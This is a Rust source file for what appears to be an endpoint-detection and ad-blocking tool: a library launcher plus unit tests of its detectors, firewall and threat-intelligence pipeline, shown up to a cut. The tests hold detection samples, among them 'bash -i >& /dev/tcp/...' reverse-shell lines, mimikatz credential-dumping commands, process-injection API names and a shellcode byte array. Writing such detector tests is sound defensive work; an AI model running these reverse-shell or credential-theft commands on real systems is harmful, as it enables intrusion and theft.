#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::path::PathBuf;

fn platform_subdir() -> &'static str {
    if cfg!(target_os = "macos") {
        "macos"
    } else if cfg!(target_os = "windows") {
        "windows"
    } else {
        "linux"
    }
}

fn push_root_lib_candidates(candidates: &mut Vec<PathBuf>, root: & std::path::Path, names: &[&str]) {
    let os_sub = platform_subdir();
    for n in names {
        candidates.push(root.join("lib").join(n));
        candidates.push(root.join("platforms").join(os_sub).join("lib").join(n));
        candidates.push(root.join("platforms").join(os_sub).join(n));
        candidates.push(root.join(n));
    }
}

fn build_lib_candidates(names: &[&str]) -> Vec<PathBuf> {
    let mut candidates = Vec::new();
    let os_sub = platform_subdir();
    if let Ok(env_root) = std::env::var("VNB_HOME") {
        let p = PathBuf::from(env_root.trim());
        if !env_root.trim().is_empty() {
            push_root_lib_candidates(&mut candidates, &p, names);
        }
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(exe_dir) = exe.parent() {
            push_root_lib_candidates(&mut candidates, exe_dir, names);
            if let Some(contents) = exe_dir.parent() {
                for n in names {
                    candidates.push(contents.join("Resources/lib").join(n));
                    candidates.push(contents.join("Frameworks").join(n));
                }
                push_root_lib_candidates(&mut candidates, contents, names);
                if let Some(root2) = contents.parent() {
                    push_root_lib_candidates(&mut candidates, root2, names);
                    if let Some(root3) = root2.parent() {
                        push_root_lib_candidates(&mut candidates, root3, names);
                    }
                }
            }
        }
    }
    if let Some(manifest) = std::env::var_os("CARGO_MANIFEST_DIR") {
        let mdir = PathBuf::from(manifest);
        push_root_lib_candidates(&mut candidates, &mdir, names);
    }
    for n in names {
        candidates.push(PathBuf::from("lib").join(n));
        candidates.push(PathBuf::from("platforms").join(os_sub).join("lib").join(n));
        candidates.push(PathBuf::from("platforms").join(os_sub).join(n));
        candidates.push(PathBuf::from(n));
    }
    candidates
}

#[inline]
fn abi_version_compatible(ver: u32) -> bool {
    (ver >> 16) == 2
}

#[cfg(not(target_os = "windows"))]
fn launch_via_dynamic_library() -> i32 {
    use std::os::raw::{c_char, c_int};
    extern "C" {
        fn dlopen(filename: *const c_char, flag: c_int) -> *mut std::ffi::c_void;
        fn dlsym(handle: *mut std::ffi::c_void, symbol: *const c_char) -> *mut std::ffi::c_void;
        fn dlerror() -> *const c_char;
        fn dlclose(handle: *mut std::ffi::c_void) -> c_int;
    }
    const RTLD_LAZY: c_int = 0x1;
    const RTLD_LOCAL: c_int = 0x4;

    let lib_name = if cfg!(target_os = "macos") {
        "libvnb_edr_gpui.dylib"
    } else {
        "libvnb_edr_gpui.so"
    };
    let mut candidates = build_lib_candidates(&[lib_name]);
    candidates.push(PathBuf::from(lib_name));
    let mut last_err = String::new();

    unsafe {
        for cand in &candidates {
            if cand.components().count() > 1 && !cand.exists() {
                continue;
            }
            if let Ok(c_path) = std::ffi::CString::new(cand.to_string_lossy().as_bytes()) {
                let h = dlopen(c_path.as_ptr(), RTLD_LAZY | RTLD_LOCAL);
                if !h.is_null() {
                    let abi_sym = dlsym(h, b"vnb_edr_abi_version\0".as_ptr() as *const c_char);
                    if !abi_sym.is_null() {
                        let abi_fn: unsafe extern "C" fn() -> u32 = std::mem::transmute(abi_sym);
                        let ver = abi_fn();
                        if !abi_version_compatible(ver) {
                            last_err.push_str(&format!(
                                "[abi-mismatch {}]: got=0x{:08x}; ",
                                cand.display(),
                                ver
                            ));
                            let _ = dlclose(h);
                            continue;
                        }
                    }
                    let sym = dlsym(h, b"vnb_edr_run_from_cli\0".as_ptr() as *const c_char);
                    if !sym.is_null() {
                        let entry: unsafe extern "C" fn() -> i32 = std::mem::transmute(sym);
                        let rc = entry();
                        let _ = dlclose(h);
                        return rc;
                    }
                    let err = dlerror();
                    if !err.is_null() {
                        last_err.push_str(&format!(
                            "[dlsym {}]: {}; ",
                            cand.display(),
                            std::ffi::CStr::from_ptr(err).to_string_lossy()
                        ));
                    }
                    let _ = dlclose(h);
                } else {
                    let err = dlerror();
                    if !err.is_null() {
                        last_err.push_str(&format!(
                            "[dlopen {}]: {}; ",
                            cand.display(),
                            std::ffi::CStr::from_ptr(err).to_string_lossy()
                        ));
                    }
                }
            }
        }
    }
    eprintln!("ERROR: {} failed to load: {}", lib_name, last_err);
    1
}

#[cfg(target_os = "windows")]
fn launch_via_dynamic_library() -> i32 {
    use std::os::windows::ffi::OsStrExt;
    #[link(name = "kernel32")]
    extern "system" {
        fn LoadLibraryW(lpLibFileName: *const u16) -> *mut std::ffi::c_void;
        fn GetProcAddress(hModule: *mut std::ffi::c_void, lpProcName: *const u8) -> *mut std::ffi::c_void;
        fn FreeLibrary(hLibModule: *mut std::ffi::c_void) -> i32;
        fn GetLastError() -> u32;
        fn SetDllDirectoryW(lpPathName: *const u16) -> i32;
        fn SetErrorMode(uMode: u32) -> u32;
    }
    const SEM_FAILCRITICALERRORS: u32 = 0x0001;

    let mut candidates = build_lib_candidates(&["vnb_edr_gpui.dll", "libvnb_edr_gpui.dll"]);
    candidates.push(PathBuf::from("vnb_edr_gpui.dll"));
    let mut last_err = String::new();
    unsafe {
        let prev_mode = SetErrorMode(SEM_FAILCRITICALERRORS);
        for cand in &candidates {
            if cand.components().count() > 1 && !cand.exists() {
                continue;
            }
            if let Some(parent) = cand.parent().filter(|p| !p.as_os_str().is_empty()) {
                let pwide: Vec<u16> = parent
                    .as_os_str()
                    .encode_wide()
                    .chain(std::iter::once(0))
                    .collect();
                let _ = SetDllDirectoryW(pwide.as_ptr());
            }
            let wide: Vec<u16> = cand
                .as_os_str()
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
            let h = LoadLibraryW(wide.as_ptr());
            if !h.is_null() {
                let abi_sym = GetProcAddress(h, b"vnb_edr_abi_version\0".as_ptr());
                if !abi_sym.is_null() {
                    let abi_fn: unsafe extern "C" fn() -> u32 = std::mem::transmute(abi_sym);
                    let ver = abi_fn();
                    if !abi_version_compatible(ver) {
                        last_err.push_str(&format!(
                            "[abi-mismatch {}]: got=0x{:08x}; ",
                            cand.display(),
                            ver
                        ));
                        let _ = FreeLibrary(h);
                        continue;
                    }
                }
                let sym = GetProcAddress(h, b"vnb_edr_run_from_cli\0".as_ptr());
                if !sym.is_null() {
                    let entry: unsafe extern "C" fn() -> i32 = std::mem::transmute(sym);
                    let rc = entry();
                    let _ = SetDllDirectoryW(std::ptr::null());
                    let _ = FreeLibrary(h);
                    let _ = SetErrorMode(prev_mode);
                    return rc;
                }
                last_err.push_str(&format!(
                    "[GetProcAddress {}]: win32_err={}; ",
                    cand.display(),
                    GetLastError()
                ));
                let _ = FreeLibrary(h);
            } else {
                last_err.push_str(&format!(
                    "[LoadLibraryW {}]: win32_err={}; ",
                    cand.display(),
                    GetLastError()
                ));
            }
        }
        let _ = SetDllDirectoryW(std::ptr::null());
        let _ = SetErrorMode(prev_mode);
    }
    eprintln!("ERROR: vnb_edr_gpui.dll failed to load: {}", last_err);
    1
}

fn main() {
    let code = launch_via_dynamic_library();
    std::process::exit(code);
}

#[cfg(test)]
mod tests {
    use vnb_edr_gpui::contract::{HostContextProfile, LatentIntent, PolicyAction, SEQ_LEN};
    use vnb_edr_gpui::decision_model::PolicyDecisionEngine;
    use vnb_edr_gpui::edr_engine::LocalEdrEngine;
    use vnb_edr_gpui::real_scanner::RealWindowScanner;

    #[test]
    fn test_real_os_window_scanning_and_decision_model_pipeline() {
        let engine = PolicyDecisionEngine::new();
        let mut scanner = RealWindowScanner::new();
        let windows = scanner.scan_real_desktop(&engine);
        assert!(scanner.screen_size.0 >= 1280 && scanner.screen_size.1 >= 800);
        for w in &windows {
            let sum_z: f32 = w.decision.intent_probs.iter().sum();
            assert!((sum_z - 1.0).abs() < 1e-3);
        }

        let z1_feat = [
            0.95, 0.96, 0.94, 0.92,
            0.08, 0.88, 0.04, 0.40,
            0.85, 0.04, 0.02, 0.10,
        ];
        let host_with_doc = HostContextProfile {
            has_open_user_document: true,
            active_document_hint: Some("季度汇报.docx".to_string()),
            is_critical_shell_host: false,
            has_main_work_window: true,
        };
        let out_z1 = engine.evaluate(&[z1_feat; SEQ_LEN], &host_with_doc);
        assert_eq!(out_z1.dominant_intent().0, LatentIntent::Z1HostBundledAd);
        assert_eq!(out_z1.chosen_action, PolicyAction::A2SurgicalMute);

        let z2_feat = [
            0.92, 0.95, 0.92, 0.90, 0.15, 0.90, 0.85, 0.55, 0.88, 0.35, 0.05, 0.92,
        ];
        let standalone_host = HostContextProfile {
            has_open_user_document: false,
            active_document_hint: None,
            is_critical_shell_host: false,
            has_main_work_window: false,
        };
        let out_z2 = engine.evaluate(&[z2_feat; SEQ_LEN], &standalone_host);
        assert_eq!(out_z2.dominant_intent().0, LatentIntent::Z2ParasiticAdModule);
        assert_eq!(out_z2.chosen_action, PolicyAction::A3ProcessIsolate);

        let z3_feat = [
            0.95, 0.90, 0.96, 1.00, 0.92, 0.88, 0.90, 0.94, 0.90, 0.95, 0.94, 0.96,
        ];
        let out_z3 = engine.evaluate(&[z3_feat; SEQ_LEN], &standalone_host);
        assert_eq!(out_z3.dominant_intent().0, LatentIntent::Z3SilentDropper);
        assert_eq!(out_z3.chosen_action, PolicyAction::A4RootPurge);

        let bundle = vnb_edr_gpui::pretrained_models::PretrainedModelBundle::global();
        assert_eq!(bundle.token_to_id.len(), 32768);
        assert!(bundle.safetensors_view.entries.len() >= 100);
        assert_eq!(bundle.hidden_dim, 3584);
        assert!(bundle.ad_guard_loaded);
        assert!(bundle.total_gbdt_trees() >= 800);

        let rev_before = engine.current_revision();
        let mem_before = engine.mosaic_memory_count();
        let rev_after = engine.adapt_from_user_feedback(
            &[z1_feat; SEQ_LEN],
            &host_with_doc,
            PolicyAction::A2SurgicalMute,
        );
        assert_eq!(rev_after, rev_before + 1);
        assert_eq!(engine.mosaic_memory_count(), mem_before + 1);

        let ctx_out = engine.evaluate_with_context(
            &[z1_feat; SEQ_LEN],
            &host_with_doc,
            "promo_helper_98a.exe",
            r"C:\Users\Admin\AppData\Local\Temp\promo_helper_98a.exe",
            "特惠弹窗",
        );
        assert!(ctx_out.jev_noul_prob > 0.80);
        assert!(ctx_out.jev_threat_score > 4.0);
        assert!(ctx_out.mosaic_hamming_sim >= 0.75);
    }

    #[test]
    fn test_local_edr_five_domains_and_surgical_remediation() {
        let mut edr = LocalEdrEngine::new();
        assert!(!edr.live_processes.is_empty());
        assert!(!edr.persistence_entries.is_empty());
        assert!(!edr.fim_records.is_empty());
        assert!(!edr.active_sockets.is_empty());

        if !edr.alerts.is_empty() {
            let first_alert_id = edr.alerts[0].alert_id;
            let rev_before = edr.decision_engine.current_revision();
            let rem_res =
                edr.execute_alert_remediation(first_alert_id, PolicyAction::A0PassAndUntag);
            assert!(rem_res.is_some());
            assert!(edr.decision_engine.current_revision() > rev_before);
        }

        edr.firewall_ips.disable_persistence();
        let block_msg = edr.block_c2_socket(9999, "198.51.100.44:4444", "/usr/bin/nc");
        assert!(block_msg.contains("198.51.100.44:4444"));
        assert!(edr.blocked_c2_endpoints.contains("198.51.100.44:4444"));

        let _ = edr.analyze_persistence_with_llm(0, "deep-7b");
        let _ = edr.analyze_socket_with_llm(0, "deep-7b");
        let _ = edr.analyze_fim_with_llm(0, "deep-7b");
        let forensic_rep = edr.run_deep_forensic_collaboration(
            "TEST_KEY",
            std::process::id(),
            "vnb-security-assistant",
            "/usr/bin/true",
            "6379",
        );
        assert!(
            forensic_rep.contains("证据包已落盘") || forensic_rep.contains("谱系与工作目录"),
            "unexpected forensic report: {}",
            forensic_rep
        );
        let accel = vnb_edr_gpui::pretrained_models::native_dylib_accel();
        #[cfg(target_os = "macos")]
        assert!(accel.bittrit_loaded && accel.mlx_bittrit_loaded && accel.mlx_qwen38_loaded);
        let _ = accel;
        assert!(edr.memory_sync_count >= 1);

        let benign_http = vnb_edr_gpui::pretrained_models::inspect_network_payload_t5b8(
            b"GET /v1/health HTTP/1.1\r\nHost: localhost:9006\r\nAccept: application/json\r\n\r\n{\"ok\": true}",
            "vnb-security-assistant",
            51000,
            9006,
            false,
        );
        assert!(!benign_http.is_attack, "benign HTTP should not be flagged: {:?}", benign_http);
        assert!(benign_http.recon_error < 0.25);

        let shellcode_pkt = vnb_edr_gpui::pretrained_models::inspect_network_payload_t5b8(
            &[0x90, 0x90, 0x90, 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0xff, 0x0f, 0x05, 0xcc],
            "suspicious_worker",
            52000,
            8080,
            false,
        );
        assert!(shellcode_pkt.is_attack, "shellcode packet must be detected");
        assert!(shellcode_pkt.recon_error > benign_http.recon_error * 2.0);
    }

    #[test]
    fn test_ad_blocker_and_whiterabbit_ad_guard_pipeline() {
        use std::fs;
        use vnb_edr_gpui::ad_blocker::{AdBlockerEngine, BUILTIN_AD_TRACKER_DOMAINS};
        use vnb_edr_gpui::pretrained_models::PretrainedModelBundle;

        let bundle = PretrainedModelBundle::global();
        assert!(bundle.transformer_layers.len() >= 4);
        assert_eq!(bundle.mlp_h1_dim, 512);
        assert_eq!(bundle.mlp_h2_dim, 256);

        let benign = bundle.classify_ad_semantic(
            "Finder",
            "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
            "桌面",
        );
        let popup = bundle.classify_ad_semantic(
            "promo_helper",
            "/Applications/App.app/Contents/Helpers/promo_helper",
            "限时特惠弹窗 - 立即领取VIP优惠券",
        );
        let tracker = bundle.classify_ad_semantic(
            "googlesyndication",
            "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
            "AdSense script",
        );
        assert_eq!(benign.predicted_class, 0, "Finder must classify normal: {:?}", benign);
        assert!(popup.ad_risk_score > 0.70, "Popup must have high ad score: {:?}", popup);
        assert!(tracker.ad_risk_score > 0.70, "Tracker must have high ad score: {:?}", tracker);

        // 在独立临时沙箱测试 Hosts 广告盾注入、幂等性与无损卸载（绝不改动真实 /etc/hosts）
        let sandbox = std::env::temp_dir().join(format!("vnb_ad_test_{}", std::process::id()));
        let _ = fs::remove_dir_all(&sandbox);
        fs::create_dir_all(&sandbox).unwrap();
        let fake_hosts = sandbox.join("hosts");
        let original_hosts = "127.0.0.1 localhost\n::1 localhost\n";
        fs::write(&fake_hosts, original_hosts).unwrap();

        let mut blocker = AdBlockerEngine::new();
        assert!(blocker.domain_rules.len() >= BUILTIN_AD_TRACKER_DOMAINS.len());

        let install_res = blocker.install_ad_shield_to_hosts_path(&fake_hosts, false);
        assert!(install_res.is_ok(), "Temp hosts install failed: {:?}", install_res);
        let (active, cnt) = AdBlockerEngine::check_hosts_ad_shield_active(&fake_hosts);
        assert!(active);
        assert!(cnt >= BUILTIN_AD_TRACKER_DOMAINS.len());

        // 幂等二次写入不应重复堆叠条目
        let _ = blocker.install_ad_shield_to_hosts_path(&fake_hosts, false);
        let (_, cnt2) = AdBlockerEngine::check_hosts_ad_shield_active(&fake_hosts);
        assert_eq!(cnt, cnt2);

        let remove_res = blocker.remove_ad_shield_from_hosts_path(&fake_hosts, false);
        assert!(remove_res.is_ok());
        let restored = fs::read_to_string(&fake_hosts).unwrap();
        assert_eq!(restored.trim(), original_hosts.trim());

        // 测试沙箱广告驻留 LaunchAgent 扫描与隔离清理
        let fake_la_dir = sandbox.join("LaunchAgents");
        fs::create_dir_all(&fake_la_dir).unwrap();
        let fake_plist = fake_la_dir.join("com.mackeeper.MacKeeperAgent.plist");
        fs::write(&fake_plist, "<plist><string>mackeeper promo updater</string></plist>").unwrap();

        blocker.scan_ad_artifacts(Some(&[fake_la_dir.clone()]));
        assert!(
            blocker.cleanup_candidates.iter().any(|c| c.path.contains("MacKeeperAgent")),
            "Adware plist should be detected: {:?}",
            blocker.cleanup_candidates
        );
        let (cleaned_cnt, _) = blocker.clean_all_pending_artifacts();
        assert!(cleaned_cnt >= 1);
        assert!(!fake_plist.exists());

        // 清理测试产生在 quarantine_vault 的测试隔离备份
        for c in &blocker.cleanup_candidates {
            if let Some(ref bkup) = c.quarantine_backup {
                let _ = fs::remove_file(bkup);
            }
        }
        let _ = fs::remove_dir_all(&sandbox);
    }

    #[test]
    fn test_firewall_and_ips_engine_pipeline() {
        use std::fs;
        use vnb_edr_gpui::edr_engine::{LiveProcessRecord, NetworkSocketRecord};
        use vnb_edr_gpui::firewall_ips::{
            FirewallAction, FirewallDirection, FirewallIpsEngine, FirewallProtocol, IpsCategory,
            IpsMode,
        };
        use vnb_edr_gpui::contract::{HostContextProfile, PolicyAction, FEAT_DIM, SEQ_LEN};
        use vnb_edr_gpui::decision_model::PolicyDecisionEngine;

        let mut fw = FirewallIpsEngine::new_sandbox();
        assert!(fw.firewall_enabled);
        assert_eq!(fw.mode, IpsMode::PreventAutoBlock);
        assert!(fw.active_rules_count() >= 4);

        // 1. 高危端口一键加固（新增 6379/445/3389/1337/11211 等）
        let hardened = fw.harden_high_risk_ports();
        assert!(hardened >= 4, "Should harden at least 4 new high-risk ports, got {}", hardened);

        // 2. 自定义 CIDR 规则匹配、切换与删除
        let cidr_rid = fw.add_rule(
            "CIDR 恶意网段阻断",
            FirewallDirection::Outbound,
            FirewallProtocol::Tcp,
            "192.0.2.0/24",
            0,
            "*",
            FirewallAction::Block,
            "TEST-CIDR",
            false,
        );
        let hit = fw.evaluate_firewall_connection(
            FirewallDirection::Outbound,
            FirewallProtocol::Tcp,
            "192.0.2.88",
            443,
            "curl",
        );
        assert_eq!(hit, Some((cidr_rid.clone(), FirewallAction::Block)));
        assert_eq!(
            fw.toggle_rule(&cidr_rid).map(|(enabled, _)| enabled),
            Some(false)
        );
        assert!(fw.evaluate_firewall_connection(
            FirewallDirection::Outbound,
            FirewallProtocol::Tcp,
            "192.0.2.88",
            443,
            "curl",
        )
        .is_none());
        assert!(fw.remove_rule(&cidr_rid));

        // 3. 沙箱导出跨平台内核防火墙规则（绝不触碰宿主机真实 PF/netsh）
        let sandbox_dir = std::env::temp_dir().join(format!("vnb_fw_test_{}", std::process::id()));
        let _ = fs::remove_dir_all(&sandbox_dir);
        fs::create_dir_all(&sandbox_dir).unwrap();
        let stage_file = sandbox_dir.join("vnb_fw_stage.anchor");
        let sync_res = fw.sync_to_os_firewall(false, Some(&stage_file));
        assert!(sync_res.is_ok(), "Sandbox export should succeed: {:?}", sync_res);
        let stage_content = fs::read_to_string(&stage_file).unwrap();
        assert!(
            stage_content.contains("6379") && stage_content.contains("4444"),
            "Exported OS firewall rules must include shielded high-risk ports: {}",
            stage_content
        );
        let _ = fs::remove_dir_all(&sandbox_dir);

        // 4. IPS + T5B8 四大攻击载荷检测 + PreventAutoBlock 自动联动封堵
        let rev = fw.simulate_ips_attack_probe("revshell");
        assert!(rev.is_malicious);
        assert!(rev.blocked_by_firewall);
        let rev_ev = rev.ips_event.expect("Reverse shell must emit IPS event");
        assert_eq!(rev_ev.category, IpsCategory::ReverseShell);
        assert!(rev_ev.auto_blocked);
        assert!(rev_ev.linked_rule_id.is_some());

        let sc = fw.simulate_ips_attack_probe("shellcode");
        assert!(sc.is_malicious && sc.blocked_by_firewall);
        assert_eq!(sc.ips_event.unwrap().category, IpsCategory::ShellcodeMemoryInject);

        let rce = fw.simulate_ips_attack_probe("redis_rce");
        assert!(rce.is_malicious && rce.blocked_by_firewall);
        assert_eq!(rce.ips_event.unwrap().category, IpsCategory::ExploitRce);

        let sqli = fw.simulate_ips_attack_probe("sqli_jndi");
        assert!(sqli.is_malicious && sqli.blocked_by_firewall);

        // 正常本地 127.0.0.1:9006 JSON 绝不误杀
        let benign = fw.simulate_ips_attack_probe("benign");
        assert!(!benign.is_malicious, "Benign 127.0.0.1:9006 JSON must not trigger IPS: {:?}", benign.verdict_summary);
        assert!(!benign.blocked_by_firewall);

        // 5. 测试加白回滚解除对 198.51.100.44 的阻断
        let unblock_msg = fw.allowlist_ip_and_unblock("198.51.100.44");
        assert!(unblock_msg.contains("198.51.100.44"));
        assert!(
            fw.evaluate_firewall_connection(
                FirewallDirection::Outbound,
                FirewallProtocol::Tcp,
                "198.51.100.44",
                80,
                "curl"
            )
            .is_none()
        );

        // 6. 测试 DetectOnly 模式仅记录事件、不下发自动阻断规则
        fw.set_ips_mode(IpsMode::DetectOnly);
        let rules_before_detect = fw.rules.len();
        let det_only = fw.inspect_payload_ips(
            b"bash -i >& /dev/tcp/198.51.100.99/5555 0>&1",
            "python3",
            9991,
            51200,
            "198.51.100.99",
            5555,
            false,
        );
        assert!(det_only.is_malicious);
        assert!(!det_only.blocked_by_firewall);
        assert_eq!(fw.rules.len(), rules_before_detect);
        assert!(!det_only.ips_event.unwrap().auto_blocked);

        // 7. 行为级遥测评估（端口扫描 + 0.0.0.0:6379 暴露）
        fw.set_ips_mode(IpsMode::PreventAutoBlock);
        let z_feat = [0.0f32; FEAT_DIM];
        let dec = PolicyDecisionEngine::new().evaluate_with_context(
            &[z_feat; SEQ_LEN],
            &HostContextProfile {
                has_open_user_document: false,
                active_document_hint: None,
                is_critical_shell_host: false,
                has_main_work_window: false,
            },
            "scan_tool",
            "/tmp/scan_tool",
            "port sweep",
        );
        let procs = vec![LiveProcessRecord {
            pid: 8888,
            ppid: 1,
            uid: 501,
            cpu_pct: 5.0,
            rss_mb: 12.0,
            comm: "scan_tool".to_string(),
            exe_path: "/tmp/scan_tool".to_string(),
            cmdline: "/tmp/scan_tool -p 1-1000".to_string(),
            parent_comm: "launchd".to_string(),
            code_signer: "Unsigned".to_string(),
            binary_entropy: 6.2,
            has_dyld_inject: false,
            dyld_env_detail: String::new(),
            in_temp_or_hidden: true,
            has_dangerous_flags: false,
            is_supply_chain_anomaly: false,
            is_reverse_shell_pattern: false,
            active_sockets_count: 9,
            wildcard_listen_ports: vec![],
            frame_features: z_feat,
            decision: dec,
            severity: vnb_edr_gpui::edr_engine::ThreatSeverity::High,
            status_note: "test".to_string(),
            username: "tester".to_string(),
            tty: String::new(),
            elapsed_time: "00:05".to_string(),
            ancestry_chain: "launchd(1) -> scan_tool(8888)".to_string(),
            cwd: "/tmp".to_string(),
            entry_script: String::new(),
            injected_modules: Vec::new(),
            binary_sha256: String::new(),
        }];
        let mut sockets = Vec::new();
        for p in 20..30u16 {
            sockets.push(NetworkSocketRecord {
                socket_id: format!("s-{}", p),
                pid: 8888,
                process_name: "scan_tool".to_string(),
                exe_path: "/tmp/scan_tool".to_string(),
                protocol: "TCP".to_string(),
                local_endpoint: format!("10.0.0.5:{}", 50000 + p),
                remote_endpoint: format!("203.0.113.50:{}", p),
                remote_ip: "203.0.113.50".to_string(),
                local_port: 50000 + p,
                remote_port: p,
                state: "SYN_SENT".to_string(),
                is_wildcard_exposed: false,
                is_c2_suspicious: false,
                c2_reason: String::new(),
                threat_score: 0.7,
                blocked: false,
                t5b8_hex: "0x0000".to_string(),
                t5_regime: 120,
                t5b8_recon_error: 0.2,
                t5b8_attack_class: String::new(),
                proc_cmdline: String::new(),
                proc_cwd: String::new(),
                parent_summary: String::new(),
                service_unit: String::new(),
                config_path_hint: String::new(),
                ip_scope_hint: "公网 IP".to_string(),
                remote_domain_hint: String::new(),
            });
        }
        sockets.push(NetworkSocketRecord {
            socket_id: "s-redis".to_string(),
            pid: 9999,
            process_name: "redis-server".to_string(),
            exe_path: "/usr/local/bin/redis-server".to_string(),
            protocol: "TCP".to_string(),
            local_endpoint: "*:6379".to_string(),
            remote_endpoint: "*:*".to_string(),
            remote_ip: "*".to_string(),
            local_port: 6379,
            remote_port: 0,
            state: "LISTEN".to_string(),
            is_wildcard_exposed: true,
            is_c2_suspicious: false,
            c2_reason: "Redis wildcard exposure".to_string(),
            threat_score: 0.9,
            blocked: false,
            t5b8_hex: "0xF101".to_string(),
            t5_regime: 240,
            t5b8_recon_error: 0.45,
            t5b8_attack_class: "Wildcard".to_string(),
            proc_cmdline: String::new(),
            proc_cwd: String::new(),
            parent_summary: String::new(),
            service_unit: String::new(),
            config_path_hint: String::new(),
            ip_scope_hint: "Wildcard (全网卡暴露)".to_string(),
            remote_domain_hint: String::new(),
        });
        let beh_events = fw.evaluate_sockets_and_processes(&sockets, &procs);
        assert!(
            beh_events.iter().any(|e| e.category == IpsCategory::PortScanSweep),
            "Must detect multi-port scan: {:?}",
            beh_events
        );
        assert!(
            beh_events.iter().any(|e| e.category == IpsCategory::WildcardServiceExposure),
            "Must detect wildcard 6379 exposure: {:?}",
            beh_events
        );
        let _ = PolicyAction::A0PassAndUntag;
    }

    #[test]
    fn test_threat_intel_fingerprint_and_code_gene_pipeline() {
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;
        use vnb_edr_gpui::edr_engine::LocalEdrEngine;
        use vnb_edr_gpui::threat_intel::{
            compute_sha256_hex, extract_code_gene_profile, extract_network_attack_fingerprint,
            ThreatIntelEngine,
        };

        // 1. 验证默认预配置多情报库（默认含本地 9006 + 内置基因与IOC库 + 3个主流云端预设模板）
        let mut ti = ThreatIntelEngine::new_sandbox();
        assert!(
            ti.feeds.len() >= 5,
            "Expected >= 5 default threat intelligence feeds, got {}",
            ti.feeds.len()
        );
        assert_eq!(
            ti.enabled_feeds_count(),
            2,
            "Expected 2 enabled default offline feeds (Local 9006 + Builtin Vault)"
        );

        // 2. 验证代码基因提取（恶意内存注入Loader特征样本 vs 良性常规模块）
        let mut temp_loader_path = std::env::temp_dir();
        temp_loader_path.push(format!(
            "vnb_ti_gene_probe_{}.bin",
            std::process::id()
        ));
        let mut mal_payload: Vec<u8> = vec![0x90; 64]; // NOP sled
        mal_payload.extend_from_slice(
            b"VirtualAlloc CreateRemoteThread WriteProcessMemory LoadLibraryA /dev/tcp/198.51.100.77/4444 mimikatz sekurlsa::logonpasswords DYLD_INSERT_LIBRARIES xmrig --donate-level",
        );
        mal_payload.extend_from_slice(&[0x0F, 0x05, 0xC3, 0xFF, 0xE4]);
        std::fs::write(&temp_loader_path, &mal_payload).expect("write temp gene sample");

        let gene_mal = extract_code_gene_profile(
            &temp_loader_path.to_string_lossy(),
            None,
            "dropper_probe",
            None,
        );
        let _ = std::fs::remove_file(&temp_loader_path);

        assert_eq!(gene_mal.file_sha256, compute_sha256_hex(&mal_payload));
        assert!(!gene_mal.gene_simhash_64.is_empty() && gene_mal.gene_simhash_64 != "0000000000000000");
        assert_eq!(gene_mal.rolling_gene_blocks.len(), 8);
        assert!(
            gene_mal.gene_risk_score >= 0.60,
            "Malicious loader sample must score >= 0.60, got {}",
            gene_mal.gene_risk_score
        );
        assert!(
            gene_mal.extracted_api_genes.iter().any(|g| g.contains("VirtualAlloc"))
                && gene_mal.extracted_api_genes.iter().any(|g| g.contains("NOP") || g.contains("SYSCALL")),
            "Must extract VirtualAlloc and opcode genes: {:?}",
            gene_mal.extracted_api_genes
        );
        assert!(
            !gene_mal.closest_gene_family.is_empty(),
            "Should match closest curated gene family"
        );

        let clean_bytes = b"Mozilla/5.0 standard benign client runtime configuration buffer without shellcode or credential theft markers";
        let gene_clean = extract_code_gene_profile("", Some(clean_bytes), "benign_app", None);
        assert!(
            gene_clean.gene_risk_score < 0.20,
            "Clean buffer gene_risk_score should remain low (<0.20), got {}",
            gene_clean.gene_risk_score
        );

        // 3. 验证网络攻击指纹提取（反连Shell + 敏感端口 + 明文C2负载）
        let net_fp = extract_network_attack_fingerprint(
            "198.51.100.77:4444",
            "198.51.100.77",
            4444,
            "dropper_probe",
            Some(b"bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"),
            None,
            &[],
        );
        assert!(
            net_fp.network_risk_score >= 0.55,
            "Reverse shell payload must score >= 0.55, got {}",
            net_fp.network_risk_score
        );
        assert!(
            !net_fp.protocol_family.is_empty(),
            "Expected non-empty protocol_family"
        );
        assert!(!net_fp.payload_sha256.is_empty());
        assert!(!net_fp.matched_attack_markers.is_empty());

        // 4. 启动本地真实 HTTP/1.1 Loopback 情报模拟服务端，验证多情报源配置、HTTP联动、融合裁决与增删改重置
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind mock threat intel server");
        let port = listener.local_addr().unwrap().port();
        let stop_flag = Arc::new(AtomicBool::new(false));
        let stop_srv = stop_flag.clone();
        let server_handle = std::thread::spawn(move || {
            let _ = listener.set_nonblocking(true);
            let started = std::time::Instant::now();
            while !stop_srv.load(Ordering::Relaxed)
                && started.elapsed() < std::time::Duration::from_secs(5)
            {
                match listener.accept() {
                    Ok((mut stream, _)) => {
                        let _ = stream.set_nonblocking(false);
                        let _ = stream.set_read_timeout(Some(std::time::Duration::from_millis(500)));
                        let mut buf = [0u8; 2048];
                        let _ = stream.read(&mut buf);
                        let req_str = String::from_utf8_lossy(&buf);
                        let body = if req_str.contains("test-secret-key-999") {
                            r#"{"malicious":true,"score":0.93,"family":"UnitTest-APT-Beacon","tags":["C2","Beacon"]}"#
                        } else {
                            r#"{"malicious":false,"score":0.1}"#
                        };
                        let resp = format!(
                            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                            body.len(),
                            body
                        );
                        let _ = stream.write_all(resp.as_bytes());
                        let _ = stream.flush();
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(std::time::Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });

        let feed_url = format!("http://127.0.0.1:{}/api/v1/lookup?ioc={{ioc}}", port);
        let added_id = ti
            .add_custom_feed("MockLocalTIP", &feed_url, "X-Test-Key", "test-secret-key-999")
            .expect("add custom REST feed");
        assert!(ti.feeds.iter().any(|f| f.feed_id == added_id && f.enabled));

        let rep = ti.investigate_target(
            "198.51.100.77:4444",
            12345,
            "dropper_probe",
            None,
            Some("198.51.100.77"),
            Some(4444),
            Some(&mal_payload),
            None,
            &[],
            false,
        );
        assert!(
            rep.feeds_hit_count >= 2,
